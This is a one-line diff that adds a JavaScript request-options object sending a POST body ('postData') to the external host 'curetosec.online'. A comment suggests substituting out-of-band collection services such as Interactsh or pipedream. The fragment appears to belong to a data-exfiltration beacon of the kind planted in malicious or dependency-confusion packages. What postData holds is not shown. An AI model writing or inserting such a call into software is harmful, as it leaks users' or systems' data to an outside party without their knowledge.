@@ -1,0 +1,1 @@
+var options = {    hostname: "curetosec.online", //replace burpcollaborator.net with Interactsh or pipedream    port: 80,    path: "/test",    method: "POST",    headers: {        "Content-Type": "application/x-www-form-urlencoded",        "Content-Length": postData.length,    },}
